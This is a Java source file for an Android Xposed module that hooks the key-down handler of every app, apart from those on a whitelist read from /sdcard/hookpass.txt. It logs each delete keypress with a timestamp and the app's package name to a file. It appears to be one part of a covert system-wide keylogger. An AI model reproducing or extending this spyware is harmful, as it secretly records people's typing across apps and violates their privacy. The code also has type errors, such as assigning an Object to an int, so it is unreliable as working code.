package com.tf.key;

import android.icu.util.*;
import android.view.*;
import android.widget.*;
import de.robv.android.xposed.*;
import de.robv.android.xposed.callbacks.*;
import java.util.*;

import android.icu.util.Calendar;

public class del implements IXposedHookLoadPackage
{
	public EditText ed;
	public Calendar cal;
	public Date time;
	//public String get,packname="init",temp=MainActivity.packname;
	public List passlist;
	public String pack;

	
	
	
	
	
	
	@Override
	public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam p1) throws Throwable
	{pack=p1.packageName.toString();
		
	try{
		passlist=line.getFileContent("/sdcard/hookpass.txt");
	}catch(Exception e){

		e.printStackTrace();
	}

	for(String con:passlist){
		if(pack.endsWith(con)){
			return;
		}
	}
		
		
        	de.robv.android.xposed.XposedHelpers.findAndHookMethod("android.app.Activity" , p1.classLoader, "onKeyDown",  Integer.TYPE,KeyEvent.class, new XC_MethodHook(){
////				//重写

				@Override		
				protected void afterHookedMethod(MethodHookParam param) throws Throwable
				{
					prop.packname=p1.packageName.toString();
					
					
					//prop.	packname=p1.packageName.toString();
					//Log.e("bbbbbbbbbbbb",String.valueOf( param.args[1]));
					XposedBridge.log(String.valueOf( param.args[0]));
					int del=param.args[0];
					//if(param.args[0]==112)

					//XposedBridge.log(param.getResult().toString());
					//Log.e("hooooooooook"+packname, "    :" + param.args[0]);
					if(prop.packname.equals(prop.temp)){
						prop.temp=prop.packname; 
						//Log.e("bbbbbbbbbbbb",String.valueOf( param.args[0]));
						if(del==KeyEvent.KEYCODE_DEL)
							file.jiaru("  <删除>  ");
					}
					else{
						prop.temp=prop.packname;
						if(del==KeyEvent.KEYCODE_DEL)
							file.jiaru("\n\n"+new Date().toLocaleString()+"  "+prop.packname+"  :"+"  <删除>   ");

					}
return;

				}
//
//				@Override
//				protected void afterHookedMethod(MethodHookParam param) throws Throwable
//				{
//
//
//
//					//XposedBridge.log(param.getResult().toString());
//					//Log.e("hooooooooook"+packname, "    :" + param.getResult());
//
//					//获取对象
//
//
//				}
//
			});



		// TODO: Implement this method
	}




	
	
	
	
	
		// TODO: Implement this method
	

}
